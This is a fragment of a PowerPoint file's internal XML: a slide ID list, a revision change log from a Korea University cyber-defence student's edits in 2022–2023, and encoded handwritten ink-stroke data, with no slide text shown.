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4"/>
  </p:notesMasterIdLst>
  <p:sldIdLst>
    <p:sldId id="256" r:id="rId2"/>
    <p:sldId id="264" r:id="rId3"/>
    <p:sldId id="343" r:id="rId4"/>
    <p:sldId id="282" r:id="rId5"/>
    <p:sldId id="283" r:id="rId6"/>
    <p:sldId id="278" r:id="rId7"/>
    <p:sldId id="279" r:id="rId8"/>
    <p:sldId id="280" r:id="rId9"/>
    <p:sldId id="281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4" r:id="rId27"/>
    <p:sldId id="295" r:id="rId28"/>
    <p:sldId id="297" r:id="rId29"/>
    <p:sldId id="298" r:id="rId30"/>
    <p:sldId id="299" r:id="rId31"/>
    <p:sldId id="300" r:id="rId32"/>
    <p:sldId id="301" r:id="rId33"/>
    <p:sldId id="344" r:id="rId34"/>
    <p:sldId id="265" r:id="rId35"/>
    <p:sldId id="266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275" r:id="rId44"/>
    <p:sldId id="276" r:id="rId45"/>
    <p:sldId id="277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292" r:id="rId59"/>
    <p:sldId id="364" r:id="rId60"/>
    <p:sldId id="365" r:id="rId61"/>
    <p:sldId id="293" r:id="rId62"/>
    <p:sldId id="366" r:id="rId63"/>
    <p:sldId id="296" r:id="rId64"/>
    <p:sldId id="367" r:id="rId65"/>
    <p:sldId id="368" r:id="rId66"/>
    <p:sldId id="369" r:id="rId67"/>
    <p:sldId id="302" r:id="rId68"/>
    <p:sldId id="303" r:id="rId69"/>
    <p:sldId id="304" r:id="rId70"/>
    <p:sldId id="305" r:id="rId71"/>
    <p:sldId id="370" r:id="rId72"/>
    <p:sldId id="322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343"/>
            <p14:sldId id="282"/>
            <p14:sldId id="283"/>
            <p14:sldId id="278"/>
            <p14:sldId id="279"/>
            <p14:sldId id="280"/>
            <p14:sldId id="281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4"/>
            <p14:sldId id="295"/>
            <p14:sldId id="297"/>
            <p14:sldId id="298"/>
            <p14:sldId id="299"/>
            <p14:sldId id="300"/>
            <p14:sldId id="301"/>
            <p14:sldId id="344"/>
            <p14:sldId id="265"/>
            <p14:sldId id="266"/>
            <p14:sldId id="345"/>
            <p14:sldId id="346"/>
            <p14:sldId id="347"/>
            <p14:sldId id="348"/>
            <p14:sldId id="349"/>
            <p14:sldId id="350"/>
            <p14:sldId id="351"/>
            <p14:sldId id="275"/>
            <p14:sldId id="276"/>
            <p14:sldId id="277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292"/>
            <p14:sldId id="364"/>
            <p14:sldId id="365"/>
            <p14:sldId id="293"/>
            <p14:sldId id="366"/>
            <p14:sldId id="296"/>
            <p14:sldId id="367"/>
            <p14:sldId id="368"/>
            <p14:sldId id="369"/>
            <p14:sldId id="302"/>
            <p14:sldId id="303"/>
            <p14:sldId id="304"/>
            <p14:sldId id="305"/>
            <p14:sldId id="370"/>
            <p14:sldId id="32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EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" v="7" dt="2022-11-04T02:07:28.140"/>
    <p1510:client id="{9ED96182-A0FC-441D-8CCF-01807D620068}" v="11" dt="2023-01-02T07:07:48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1" autoAdjust="0"/>
    <p:restoredTop sz="94660"/>
  </p:normalViewPr>
  <p:slideViewPr>
    <p:cSldViewPr snapToGrid="0">
      <p:cViewPr>
        <p:scale>
          <a:sx n="127" d="100"/>
          <a:sy n="127" d="100"/>
        </p:scale>
        <p:origin x="-54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S::lhm1024@korea.ac.kr::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{9ED96182-A0FC-441D-8CCF-01807D620068}"/>
    <pc:docChg chg="modSld">
      <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.ac.kr::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{9ED96182-A0FC-441D-8CCF-01807D620068}" dt="2023-01-02T07:07:48.089" v="10"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.ac.kr::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{9ED96182-A0FC-441D-8CCF-01807D620068}" dt="2023-01-02T05:34:37.577" v="1" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3298506452" sldId="270"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.ac.kr::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{9ED96182-A0FC-441D-8CCF-01807D620068}" dt="2023-01-02T05:34:37.577" v="1" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3298506452" sldId="270"/>
            <ac:spMk id="3" creationId="{7D4B7DA4-77FC-4BBA-93DB-CCB380AB054C}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="addSp">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.ac.kr::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{9ED96182-A0FC-441D-8CCF-01807D620068}" dt="2023-01-02T07:07:48.089" v="10"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="261725435" sldId="344"/>
        </pc:sldMkLst>
        <pc:inkChg chg="add">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.ac.kr::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{9ED96182-A0FC-441D-8CCF-01807D620068}" dt="2023-01-02T07:07:41.714" v="2"/>
          <ac:inkMkLst>
            <pc:docMk/>
            <pc:sldMk cId="261725435" sldId="344"/>
            <ac:inkMk id="3" creationId="{44EFF540-7121-4976-4B70-6CBE1BA1B4BA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1.714" v="3"/>
          <ac:inkMkLst>
            <pc:docMk/>
            <pc:sldMk cId="261725435" sldId="344"/>
            <ac:inkMk id="5" creationId="{47B17439-25B0-102D-417F-75ABBB77FA28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3.199" v="4"/>
          <ac:inkMkLst>
            <pc:docMk/>
            <pc:sldMk cId="261725435" sldId="344"/>
            <ac:inkMk id="7" creationId="{1F94A234-524A-417A-294C-618E397AE539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5.199" v="5"/>
          <ac:inkMkLst>
            <pc:docMk/>
            <pc:sldMk cId="261725435" sldId="344"/>
            <ac:inkMk id="8" creationId="{4CDA3EEB-BE0D-A410-5FD5-199BFB7798AF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5.589" v="6"/>
          <ac:inkMkLst>
            <pc:docMk/>
            <pc:sldMk cId="261725435" sldId="344"/>
            <ac:inkMk id="9" creationId="{2B5D35C8-B24C-CC28-D689-B84C1FF4C4AE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6.933" v="7"/>
          <ac:inkMkLst>
            <pc:docMk/>
            <pc:sldMk cId="261725435" sldId="344"/>
            <ac:inkMk id="10" creationId="{B2AEE2B2-19D4-CB02-D7C9-E34E6692DB00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7.746" v="8"/>
          <ac:inkMkLst>
            <pc:docMk/>
            <pc:sldMk cId="261725435" sldId="344"/>
            <ac:inkMk id="11" creationId="{2653DC49-2A26-A755-358C-FE241315E295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7.746" v="9"/>
          <ac:inkMkLst>
            <pc:docMk/>
            <pc:sldMk cId="261725435" sldId="344"/>
            <ac:inkMk id="12" creationId="{42619D87-164B-6B01-811D-63AF1E4C0AF6}"/>
          </ac:inkMkLst>
        </pc:inkChg>
        <pc:inkChg chg="add">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="S::lhm1024@korea.ac.kr::3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="AD" clId="Web-{9ED96182-A0FC-441D-8CCF-01807D620068}" dt="2023-01-02T07:07:48.089" v="10"/>
          <ac:inkMkLst>
            <pc:docMk/>
            <pc:sldMk cId="261725435" sldId="344"/>
            <ac:inkMk id="13" creationId="{93347FE7-AC2B-A668-1750-4AAC08B17E11}"/>
          </ac:inkMkLst>
        </pc:inkChg>
      </pc:sldChg>
    </pc:docChg>
  </pc:docChgLst>
  <pc:docChgLst>
    <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}"/>
    <pc:docChg chg="addSld delSld modSld modSection">
      <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:39:25.252" v="28" actId="47"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:38:22.903" v="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16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:38:22.903" v="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029715739" sldId="26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970058276" sldId="26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549577639" sldId="26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867397301" sldId="26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386707441" sldId="26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298506452" sldId="27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086893336" sldId="27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974409974" sldId="27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744324551" sldId="27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20705930" sldId="27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158921365" sldId="27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973507590" sldId="27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32463696" sldId="27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871954873" sldId="27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47795864" sldId="27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273663756" sldId="28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621596859" sldId="28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926958716" sldId="28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283776457" sldId="28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974714718" sldId="28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760358824" sldId="28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381059366" sldId="28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776408542" sldId="28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728096664" sldId="28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762505206" sldId="28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81608289" sldId="29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009977" sldId="29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95158726" sldId="29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025170909" sldId="29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73846400" sldId="29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116554418" sldId="29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213533536" sldId="29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689901933" sldId="29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725012777" sldId="29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709264039" sldId="29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885337817" sldId="30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613051060" sldId="30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32064430" sldId="30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50336003" sldId="30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772875919" sldId="30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728646452" sldId="305"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="new del">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:39:25.252" v="28" actId="47"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4242820888" sldId="323"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="delSp add setBg delDesignElem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971522393" sldId="343"/>
        </pc:sldMkLst>
        <pc:spChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:39:23.003" v="27"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2971522393" sldId="343"/>
            <ac:spMk id="11" creationId="{8BE48C64-5364-4060-8928-FC052E77CD60}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:39:23.003" v="27"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2971522393" sldId="343"/>
            <ac:spMk id="13" creationId="{139F791B-8515-4F50-9D32-45DD7676C003}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:39:23.003" v="27"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2971522393" sldId="343"/>
            <ac:spMk id="17" creationId="{448231F9-49B7-4F41-8E74-5317B1937133}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:39:23.003" v="27"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2971522393" sldId="343"/>
            <ac:spMk id="21" creationId="{F0F9D4BA-D919-4666-B40F-2E7DBE4D83FA}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:spChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:39:23.003" v="27"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2971522393" sldId="343"/>
            <ac:spMk id="23" creationId="{E48A398B-A55F-4121-BD29-884874038395}"/>
          </ac:spMkLst>
        </pc:spChg>
        <pc:cxnChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:39:23.003" v="27"/>
          <ac:cxnSpMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2971522393" sldId="343"/>
            <ac:cxnSpMk id="15" creationId="{966A6F95-73C3-44EC-9D80-3131D2D868F1}"/>
          </ac:cxnSpMkLst>
        </pc:cxnChg>
        <pc:cxnChg chg="del">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:39:23.003" v="27"/>
          <ac:cxnSpMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2971522393" sldId="343"/>
            <ac:cxnSpMk id="19" creationId="{64BAD00C-9DF3-4EDE-8CDF-A9D88C0D2985}"/>
          </ac:cxnSpMkLst>
        </pc:cxnChg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61725435" sldId="34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195156018" sldId="34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84764566" sldId="34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904020352" sldId="34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313871063" sldId="34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62445169" sldId="34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969642847" sldId="35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320614899" sldId="35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612898225" sldId="35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509325201" sldId="35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884670508" sldId="35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630092203" sldId="35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056072038" sldId="35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369398483" sldId="35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471282631" sldId="35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818943010" sldId="35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904019834" sldId="360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4021835938" sldId="361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019860375" sldId="362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560374475" sldId="363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823872553" sldId="364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886981411" sldId="365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819844229" sldId="366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397920936" sldId="367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419352312" sldId="368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2085191365" sldId="369"/>
        </pc:sldMkLst>
      </pc:sldChg>
      <pc:sldChg chg="add">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{16B58A41-7430-4F71-9659-C4AE94747401}" dt="2022-01-09T14:39:23.003" v="27"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1828621590" sldId="370"/>
        </pc:sldMkLst>
      </pc:sld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6C5DC9A1-9364-42BA-A78B-7C433C3E275D}"/>
    <pc:docChg chg="delSld modSld modSection">
      <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{6C5DC9A1-9364-42BA-A78B-7C433C3E275D}" dt="2022-01-02T20:55:40.433" v="31" actId="20577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5:40.433" v="31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5:40.433" v="31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24952614" sldId="34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36908598" sldId="34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90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}"/>
    <pc:docChg chg="custSel modSld modMainMaster">
      <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T08:04:07.724" v="17"/>
      <pc:docMkLst>
        <pc:docMk/>
      </pc:docMkLst>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T07:27:22.702" v="8" actId="1076"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="2871954873" sldId="278"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T07:27:22.702" v="8" actId="1076"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="2871954873" sldId="278"/>
            <ac:spMk id="3" creationId="{F4ED9DBB-867D-412A-8686-C4CC0A749E9F}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T07:54:38.783" v="14" actId="20577"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="3762505206" sldId="289"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T07:54:38.783" v="14" actId="20577"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="3762505206" sldId="289"/>
            <ac:spMk id="3" creationId="{748C97CE-6E19-443F-9031-CE96A1F5E8F6}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T08:04:07.724" v="17"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="4073846400" sldId="294"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T08:04:07.724" v="17"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="4073846400" sldId="294"/>
            <ac:spMk id="3" creationId="{AA86BBAA-382F-43FE-8D83-F69C58B3DFE7}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldChg chg="modSp mod">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:12.084" v="1" actId="27636"/>
        <pc:sldMkLst>
          <pc:docMk/>
          <pc:sldMk cId="1056072038" sldId="356"/>
        </pc:sldMkLst>
        <pc:spChg chg="mod">
          <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:12.084" v="1" actId="27636"/>
          <ac:spMkLst>
            <pc:docMk/>
            <pc:sldMk cId="1056072038" sldId="356"/>
            <ac:spMk id="3" creationId="{AC0B6710-71E0-4339-AC96-E5F300BF8877}"/>
          </ac:spMkLst>
        </pc:spChg>
      </pc:sldChg>
      <pc:sldMasterChg chg="delSp modSldLayout">
        <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:28.140" v="7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90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:11.948" v="0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90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:15.529" v="2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90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:15.529" v="2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delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:17.623" v="3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90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:17.623" v="3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delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:19.835" v="4" actId="478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90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:19.835" v="4" actId="478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delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:22.795" v="5" actId="478"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="2831446787" sldId="2147483680"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:22.795" v="5" actId="478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</pc:sldLayoutChg>
        <pc:sldLayoutChg chg="delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:25.562" v="6" actId="478"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="366081474" sldId="2147483681"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:25.562" v="6" actId="478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</pc:sldLayoutChg>
        <pc:sldLayoutChg chg="delSp">
          <pc:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:28.140" v="7" actId="478"/>
          <pc:sldLayoutMkLst>
            <pc:docMk/>
            <pc:sldMasterMk cId="3145777673" sldId="2147483672"/>
            <pc:sldLayoutMk cId="3947021700" sldId="2147483683"/>
          </pc:sldLayoutMkLst>
          <pc:picChg chg="del">
            <ac:chgData name="이효민[ 학부재학 / 사이버국방학과 ]" userId="3929b77a-7aa2-4a96-a97d-3b5ce13f9d26" providerId="ADAL" clId="{90EBE657-1FC1-1542-9D9A-3A584EA4DC2A}" dt="2022-11-04T02:07:28.140" v="7" actId="478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15187 3279 20767 0 0,'9'13'3616'0'0,"11"13"-2976"0"0,15 15-448 0 0,20 9-32 0 0,17 5 32 0 0,18-3 32 0 0,12-5-128 0 0,5-12-32 0 0,6-10-64 0 0,-3-11 0 0 0,-2-7 0 0 0,-8-5 0 0 0,-2-7-64 0 0,-6-3-96 0 0,-5-4-96 0 0,-4-5-96 0 0,-4-7-96 0 0,-2-5-160 0 0,0-10-320 0 0,-2-7-576 0 0,1-13-1344 0 0,-5-10-3040 0 0,-5-6-4128 0 0,-15 10 10016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16097 3244 20767 0 0,'13'17'5088'0'0,"13"11"-4768"0"0,20 8 128 0 0,23 7 0 0 0,21 1 0 0 0,14-3-128 0 0,6-4-32 0 0,1-8-160 0 0,0-10-128 0 0,-2-7-64 0 0,-7-6 64 0 0,-2-4-128 0 0,-7-7-96 0 0,0-2-192 0 0,-4-5-160 0 0,-4-4 32 0 0,-4-4-96 0 0,-6-7-224 0 0,-3-4-640 0 0,-5-4-992 0 0,-6-6-2272 0 0,-8 0-1696 0 0,-10 3-2944 0 0,-11 7 9408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18022 2990 12639 0 0,'-9'8'6624'0'0,"-7"8"-6528"0"0,-1 10-96 0 0,-1 8 128 0 0,-3 17-32 0 0,-6 16-64 0 0,-3 15-32 0 0,-1 6-64 0 0,1 1-128 0 0,1-2-32 0 0,-3 20-640 0 0,0 4 608 0 0,4-12 0 0 0,8-19 32 0 0,7-14 64 0 0,6-15 32 0 0,4-10-64 0 0,2-9 128 0 0,2-5-32 0 0,5-3 96 0 0,5-1-32 0 0,6-5 32 0 0,4-1 128 0 0,7-3-32 0 0,12-4 32 0 0,12-4 0 0 0,10-3 64 0 0,12-2 32 0 0,7-1 96 0 0,2 0-64 0 0,4-1-32 0 0,18 0 192 0 0,5 1-224 0 0,0-1-128 0 0,-6 1-32 0 0,-2 0-32 0 0,-6 0 0 0 0,-7 0 0 0 0,-9 4-64 0 0,-5 2 64 0 0,-8-1 0 0 0,-5 0 160 0 0,-5-2-128 0 0,-8-1 32 0 0,-8-1-64 0 0,-7-1 64 0 0,-4 1-64 0 0,-4-2 64 0 0,-1 1-64 0 0,-1 0 64 0 0,0 0-64 0 0,0 0-448 0 0,-3-5 224 0 0,-7-5 320 0 0,-4-6-128 0 0,-9-4-160 0 0,-5-3 32 0 0,-1-2-64 0 0,0-1 32 0 0,-4-1 32 0 0,1 1-64 0 0,0-1-64 0 0,-2 1-96 0 0,1 0-96 0 0,2 0-32 0 0,-3 1-192 0 0,1-1-128 0 0,2 1-416 0 0,-3-1-448 0 0,1-4-448 0 0,2-1-960 0 0,2-4-1408 0 0,2 4 4512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17727 3135 11519 0 0,'13'4'2848'0'0,"13"2"-2624"0"0,11-5-32 0 0,12-2-192 0 0,15-2 0 0 0,9-4-64 0 0,6-5 32 0 0,2-1-32 0 0,1-2-64 0 0,-1 1-224 0 0,-6-1-32 0 0,-6 2 96 0 0,-7 3 96 0 0,-9 3-32 0 0,-10 3 160 0 0,-3 2 64 0 0,-4 2 0 0 0,0 0 0 0 0,3 0 128 0 0,4 1 0 0 0,-2 4 0 0 0,1 1-64 0 0,3 0-32 0 0,-3-1 32 0 0,-4-2-64 0 0,0-1 32 0 0,-1-1-32 0 0,-4-1 64 0 0,-2 0-32 0 0,-3 0 96 0 0,-1 0 2080 0 0,-6 4-1056 0 0,-5 6-704 0 0,-7 5-320 0 0,-4 5 0 0 0,-3 12 32 0 0,-7 13-64 0 0,-1 13 0 0 0,-1 8 0 0 0,-3 3 64 0 0,0-2 32 0 0,2-9 0 0 0,2-9-96 0 0,2-8-32 0 0,7-4-64 0 0,1-3-96 0 0,2 2 32 0 0,-1 3-128 0 0,2-1-128 0 0,2 2-96 0 0,-2-2-160 0 0,-2 2-32 0 0,-2 2-256 0 0,-1 3-768 0 0,-1 3-768 0 0,-1-3-1952 0 0,0 0-1440 0 0,-1-8 5792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20034 3704 20127 0 0,'18'9'4448'0'0,"22"7"-4032"0"0,31 5 160 0 0,29-1-160 0 0,29-4-256 0 0,21-8-160 0 0,17-11 0 0 0,10-9-160 0 0,14-11 0 0 0,9-10-256 0 0,5-9-192 0 0,7-5-224 0 0,6-3-544 0 0,1-7-1440 0 0,-10-2-4384 0 0,-20 0-4896 0 0,-42 11 12096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10132 6271 13375 0 0,'-17'13'2112'0'0,"-15"21"-608"0"0,-19 19-992 0 0,-14 17-320 0 0,-9 14 96 0 0,0 10 192 0 0,-1 7 320 0 0,4 7-320 0 0,5 7-256 0 0,5 11-128 0 0,5 18-96 0 0,2 23-96 0 0,3 27 96 0 0,5 29-96 0 0,6 27-160 0 0,5 24-160 0 0,5 22 32 0 0,3 12-192 0 0,6 6 0 0 0,2-2 128 0 0,0-3 192 0 0,4-6-32 0 0,3-3 96 0 0,5-4-64 0 0,7 0 32 0 0,13 0 128 0 0,13 4 0 0 0,14 1 32 0 0,19 2-64 0 0,15-2 0 0 0,18-5-64 0 0,15-6 64 0 0,10-3-32 0 0,12-8-32 0 0,6-13-288 0 0,5-11 32 0 0,-3-15-256 0 0,-4-19-544 0 0,-2-15 416 0 0,-11-17-192 0 0,-8-20 96 0 0,-10-16-512 0 0,-14-21-288 0 0,-14-20-800 0 0,-14-21-192 0 0,-18-25 2720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9179 7887 13407 0 0,'-4'13'3104'0'0,"-2"9"-2336"0"0,1 5-416 0 0,0 2-352 0 0,11 0-64 0 0,12 4 64 0 0,16 6 96 0 0,20 4 32 0 0,19 4-32 0 0,17 2 0 0 0,12-3-32 0 0,9-8 0 0 0,4-12-64 0 0,4-10 0 0 0,-1-12-64 0 0,-4-15-384 0 0,-3-15-352 0 0,-3-15-288 0 0,-3-15-544 0 0,-6-14-448 0 0,-7-9-896 0 0,-11-3-992 0 